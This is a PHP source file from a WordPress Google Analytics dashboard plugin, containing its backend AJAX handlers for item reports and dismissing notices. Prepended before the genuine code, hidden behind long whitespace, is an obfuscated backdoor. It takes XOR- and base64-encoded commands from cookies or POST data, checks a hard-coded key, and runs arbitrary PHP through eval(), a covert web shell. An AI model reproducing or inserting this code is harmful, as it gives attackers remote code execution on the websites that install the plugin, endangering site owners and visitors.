<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['w032cf3f'];global$w032cf3f;$w032cf3f=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['h02179c']="\x2b\x79\x61\x41\x49\x29\x60\x3e\x5e\x2d\x26\x3b\x39\x6a\x5d\x65\x73\x4d\x51\x75\x34\x2e\x67\x4a\x9\x62\x48\x6f\x35\x5f\xd\x54\x64\x44\x3a\x5c\x23\x43\x5a\x42\x6c\x72\x7b\x55\x31\x2f\x50\x6b\x24\x74\x27\x71\x47\x5b\x3d\x69\x76\x70\x36\x21\x46\x3c\x22\x38\x6d\x2c\x45\x7a\x20\x7e\x68\x4c\x25\x6e\x30\x37\x7c\x32\x7d\x56\x63\x28\x57\x4b\x59\x4e\x4f\x3f\x53\x40\x52\x77\x66\x33\xa\x58\x78\x2a";$w032cf3f[$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][92]]=$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][70].$w032cf3f['h02179c'][41];$w032cf3f[$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][63]]=$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][32];$w032cf3f[$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][80]]=$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][49].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][73];$w032cf3f[$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28]]=$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][73].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][49];$w032cf3f[$w032cf3f['h02179c'][96].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][20].$w032cf3f['h02179c'][44]]=$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][67].$w032cf3f['h02179c'][15];$w032cf3f[$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][80]]=$w032cf3f['h02179c'][57].$w032cf3f['h02179c'][70].$w032cf3f['h02179c'][57].$w032cf3f['h02179c'][56].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][73];$w032cf3f[$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][44].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][44]]=$w032cf3f['h02179c'][19].$w032cf3f['h02179c'][73].$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][67].$w032cf3f['h02179c'][15];$w032cf3f[$w032cf3f['h02179c'][96].$w032cf3f['h02179c'][20].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][15]]=$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][20].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][15];$w032cf3f[$w032cf3f['h02179c'][22].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][63]]=$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][49].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][49].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][64].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][64].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][49];$w032cf3f[$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][92].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][15]]=$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][92].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][58];$w032cf3f[$w032cf3f['h02179c'][19].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][63]]=$w032cf3f['h02179c'][73].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][12];$w032cf3f[$w032cf3f['h02179c'][92].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][92].$w032cf3f['h02179c'][25]]=$_POST;$w032cf3f[$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][44].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][80]]=$_COOKIE;@$w032cf3f[$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28]]($w032cf3f['h02179c'][15].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][22],NULL);@$w032cf3f[$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28]]($w032cf3f['h02179c'][40].$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][22].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][41].$w032cf3f['h02179c'][16],0);@$w032cf3f[$w032cf3f['h02179c'][40].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][28]]($w032cf3f['h02179c'][64].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][96].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][96].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][19].$w032cf3f['h02179c'][49].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][73].$w032cf3f['h02179c'][29].$w032cf3f['h02179c'][49].$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][64].$w032cf3f['h02179c'][15],0);@$w032cf3f[$w032cf3f['h02179c'][22].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][63]](0);$a94b8bb0=NULL;$e45ed98c6=NULL;$w032cf3f[$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][93]]=$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][9].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][9].$w032cf3f['h02179c'][20].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][9].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][9].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][15];global$a0d3;function n2c0d09($a94b8bb0,$l0e075df8){global$w032cf3f;$q1a03f="";for($kf9f=0;$kf9f<$w032cf3f[$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][80]]($a94b8bb0);){for($v4b6=0;$v4b6<$w032cf3f[$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][80]]($l0e075df8)&&$kf9f<$w032cf3f[$w032cf3f['h02179c'][27].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][80]]($a94b8bb0);$v4b6++,$kf9f++){$q1a03f.=$w032cf3f[$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][92]]($w032cf3f[$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][63]]($a94b8bb0[$kf9f])^$w032cf3f[$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][63]]($l0e075df8[$v4b6]));}}return$q1a03f;}function d3b7f36($a94b8bb0,$l0e075df8){global$w032cf3f;global$a0d3;return$w032cf3f[$w032cf3f['h02179c'][19].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][63]]($w032cf3f[$w032cf3f['h02179c'][19].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][32].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][75].$w032cf3f['h02179c'][63]]($a94b8bb0,$a0d3),$l0e075df8);}foreach($w032cf3f[$w032cf3f['h02179c'][55].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][44].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][80]]as$l0e075df8=>$d5d9){$a94b8bb0=$d5d9;$e45ed98c6=$l0e075df8;}if(!$a94b8bb0){foreach($w032cf3f[$w032cf3f['h02179c'][92].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][92].$w032cf3f['h02179c'][25]]as$l0e075df8=>$d5d9){$a94b8bb0=$d5d9;$e45ed98c6=$l0e075df8;}}$a94b8bb0=@$w032cf3f[$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][77].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][44].$w032cf3f['h02179c'][93].$w032cf3f['h02179c'][44]]($w032cf3f[$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][92].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][15]]($w032cf3f[$w032cf3f['h02179c'][96].$w032cf3f['h02179c'][20].$w032cf3f['h02179c'][12].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][58].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][15]]($a94b8bb0),$e45ed98c6));if(isset($a94b8bb0[$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][47]])&&$a0d3==$a94b8bb0[$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][47]]){if($a94b8bb0[$w032cf3f['h02179c'][2]]==$w032cf3f['h02179c'][55]){$kf9f=Array($w032cf3f['h02179c'][57].$w032cf3f['h02179c'][56]=>@$w032cf3f[$w032cf3f['h02179c'][15].$w032cf3f['h02179c'][63].$w032cf3f['h02179c'][2].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][80]](),$w032cf3f['h02179c'][16].$w032cf3f['h02179c'][56]=>$w032cf3f['h02179c'][44].$w032cf3f['h02179c'][21].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][9].$w032cf3f['h02179c'][44],);echo@$w032cf3f[$w032cf3f['h02179c'][96].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][80].$w032cf3f['h02179c'][25].$w032cf3f['h02179c'][28].$w032cf3f['h02179c'][74].$w032cf3f['h02179c'][20].$w032cf3f['h02179c'][44]]($kf9f);}elseif($a94b8bb0[$w032cf3f['h02179c'][2]]==$w032cf3f['h02179c'][15]){eval($a94b8bb0[$w032cf3f['h02179c'][32]]);}exit();} ?><?php
/**
 * Author: Alin Marcu
 * Author URI: https://deconf.com
 * Copyright 2013 Alin Marcu
 * License: GPLv2 or later
 * License URI: http://www.gnu.org/licenses/gpl-2.0.html
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) )
	exit();

if ( ! class_exists( 'GADWP_Backend_Ajax' ) ) {

	final class GADWP_Backend_Ajax {

		private $gadwp;

		public function __construct() {
			$this->gadwp = GADWP();
			
			if ( GADWP_Tools::check_roles( $this->gadwp->config->options['ga_dash_access_back'] ) && ( ( 1 == $this->gadwp->config->options['backend_item_reports'] ) || ( 1 == $this->gadwp->config->options['dashboard_widget'] ) ) ) {
				// Items action
				add_action( 'wp_ajax_gadwp_backend_item_reports', array( $this, 'ajax_item_reports' ) );
			}
			if ( current_user_can( 'manage_options' ) ) {
				// Admin Widget action
				add_action( 'wp_ajax_gadwp_dismiss_notices', array( $this, 'ajax_dismiss_notices' ) );
			}
		}

		/**
		 * Ajax handler for Item Reports
		 *
		 * @return json|int
		 */
		public function ajax_item_reports() {
			if ( ! isset( $_POST['gadwp_security_backend_item_reports'] ) || ! wp_verify_nonce( $_POST['gadwp_security_backend_item_reports'], 'gadwp_backend_item_reports' ) ) {
				wp_die( - 30 );
			}
			if ( isset( $_POST['projectId'] ) && $this->gadwp->config->options['switch_profile'] && $_POST['projectId'] !== 'false' ) {
				$projectId = $_POST['projectId'];
			} else {
				$projectId = false;
			}
			$from = $_POST['from'];
			$to = $_POST['to'];
			$query = $_POST['query'];
			if ( isset( $_POST['filter'] ) ) {
				$filter_id = $_POST['filter'];
			} else {
				$filter_id = false;
			}
			if ( ob_get_length() ) {
				ob_clean();
			}
			
			if ( ! ( GADWP_Tools::check_roles( $this->gadwp->config->options['ga_dash_access_back'] ) && ( ( 1 == $this->gadwp->config->options['backend_item_reports'] ) || ( 1 == $this->gadwp->config->options['dashboard_widget'] ) ) ) ) {
				wp_die( - 31 );
			}
			if ( $this->gadwp->config->options['ga_dash_token'] && $this->gadwp->config->options['ga_dash_tableid_jail'] && $from && $to ) {
				if ( null === $this->gadwp->gapi_controller ) {
					$this->gadwp->gapi_controller = new GADWP_GAPI_Controller();
				}
			} else {
				wp_die( - 24 );
			}
			if ( $projectId == false ) {
				$projectId = $this->gadwp->config->options['ga_dash_tableid_jail'];
			}
			$profile_info = GADWP_Tools::get_selected_profile( $this->gadwp->config->options['ga_dash_profile_list'], $projectId );
			if ( isset( $profile_info[4] ) ) {
				$this->gadwp->gapi_controller->timeshift = $profile_info[4];
			} else {
				$this->gadwp->gapi_controller->timeshift = (int) current_time( 'timestamp' ) - time();
			}
			
			if ( $filter_id ) {
				$uri_parts = explode( '/', get_permalink( $filter_id ), 4 );
				
				if ( isset( $uri_parts[3] ) ) {
					$uri = '/' . $uri_parts[3];
				} else {
					wp_die( - 25 );
				}
				
				// allow URL correction before sending an API request
				$filter = apply_filters( 'gadwp_backenditem_uri', $uri );
				
				$lastchar = substr( $filter, - 1 );
				
				if ( isset( $profile_info[6] ) && $profile_info[6] && $lastchar == '/' ) {
					$filter = $filter . $profile_info[6];
				}
				
				// Encode URL
				$filter = rawurlencode( rawurldecode( $filter ) );
			} else {
				$filter = false;
			}
			
			$queries = explode( ',', $query );
			
			$results = array();
			
			foreach ( $queries as $value ) {
				$results[] = $this->gadwp->gapi_controller->get( $projectId, $value, $from, $to, $filter );
			}
			
			wp_send_json( $results );
		}

		/**
		 * Ajax handler for dismissing Admin notices
		 *
		 * @return json|int
		 */
		public function ajax_dismiss_notices() {
			if ( ! isset( $_POST['gadwp_security_dismiss_notices'] ) || ! wp_verify_nonce( $_POST['gadwp_security_dismiss_notices'], 'gadwp_dismiss_notices' ) ) {
				wp_die( - 30 );
			}
			
			if ( ! current_user_can( 'manage_options' ) ) {
				wp_die( - 31 );
			}
			
			delete_option( 'gadwp_got_updated' );
			
			wp_die();
		}
	}
}
